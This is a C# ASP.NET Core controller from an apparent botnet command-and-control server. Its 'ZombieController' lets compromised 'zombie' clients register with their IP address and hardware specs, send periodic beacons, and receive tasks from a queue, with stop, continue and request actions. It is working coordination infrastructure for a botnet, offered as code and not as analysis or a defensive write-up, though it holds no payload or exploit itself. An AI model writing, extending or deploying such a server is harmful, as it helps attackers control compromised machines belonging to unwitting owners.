using C2.Enums;
using C2.Models;
using C2.POCOs;
using Microsoft.AspNetCore.Mvc;

namespace C2.Controllers;

[ApiController]
[Route("[controller]")]
public class ZombieController : AbstractController
{
    [HttpGet("ZombieTest")]
    [ProducesResponseType(StatusCodes.Status200OK)]
    public IActionResult ZombieTest() => Ok();

    [HttpPost("Register")]
    [ProducesResponseType(typeof(InitialResponse), StatusCodes.Status200OK)]
    public IActionResult Register([FromBody] InitialParameters parameters)
    {
        var specs = new BotClientSpecs()
        {
            Ram = parameters.Ram,
            CPU = parameters.CPU,
        };

        // Generate new BotClient
        string name = Randomizer.GenerateName();
        int id = Randomizer.GenerateInt();

        Console.WriteLine($"New bot registered: {name} | {id}");

        DateTime lastHeardFrom = DateTime.UtcNow;

        var connectionInfo = new BotClientConnectionInfo()
        {
            Ip = parameters.Ip,
            LastHeardFrom = lastHeardFrom
        };

        var botClient = new BotClient()
        {
            Id = id,
            Name = name,
            TaskId = -1,
            ConnectionInfo = connectionInfo,
            BotClientSpecs = specs
        };

        _ = C2State.BotManager.Bots.TryAdd(id, botClient);

        var initialResponse = new InitialResponse()
        {
            Name = name,
            Id = id
        };

        return Ok(initialResponse);
    }

    [HttpGet("Beacon")]
    [ProducesResponseType(typeof(ActionPoco), StatusCodes.Status200OK)]
    public IActionResult Beacon([FromQuery] int bot_id, [FromQuery] int task_id, [FromQuery] ProgressEnum progress)
    {
        BotClient? bot = GetBot(bot_id);

        if (bot == null)
        {
            return Ok(new ActionPoco() { Action = ActionEnum.REGISTER });
        }

        bot.CurrentProgress = progress;

        Console.WriteLine($"Zombie beaconed: {bot.Name} | {bot_id}");

        bot.ConnectionInfo.LastHeardFrom = DateTime.UtcNow;

        if (bot.StopRequested)
        {
            bot.StopRequested = false;
            bot.TaskId = -1;
            return Ok(new ActionPoco() { Action = ActionEnum.STOP });
        }

        if (task_id < 0) // Task invalid - get a new one
        {
            return Ok(new ActionPoco() { Action = ActionEnum.REQUEST });
        }
        else if (progress is ProgressEnum.FAILURE or ProgressEnum.SUCCESS) // Valid task completed - move it from executing to completed
        {
            if (C2State.TaskManager.Executing.TryGetValue(task_id, out BotTask botTask))
            {
                if (botTask != null)
                {
                    bot.CompletedTasks.Add(botTask);
                }
            }
            _ = C2State.TaskManager.CompleteTask(task_id);
            return Ok(new ActionPoco() { Action = ActionEnum.REQUEST });
        }
        else // task valid but still executing - continue
        {
            return Ok(new ActionPoco() { Action = ActionEnum.CONTINUE });
        }
    }

    [HttpGet("Request")]
    [ProducesResponseType(typeof(BotTask), StatusCodes.Status200OK)]
    [ProducesResponseType(StatusCodes.Status204NoContent)]
    public new IActionResult Request([FromQuery] int bot_id)
    {
        BotClient bot = GetBot(bot_id);
        Console.WriteLine($"Zombie requested task: {bot.Name} | {bot_id}");

        // Get the next task in queue
        BotTask? task = C2State.TaskManager.DispatchTask();

        if (task != null)
        {
            // If task - send to zombie
            bot.TaskId = task.Id;
            Console.WriteLine($"Sending out new task: {task.Task}");
            return Ok(task);
        }

        // If no task - send NoContent to zombie
        return NoContent();
    }
}
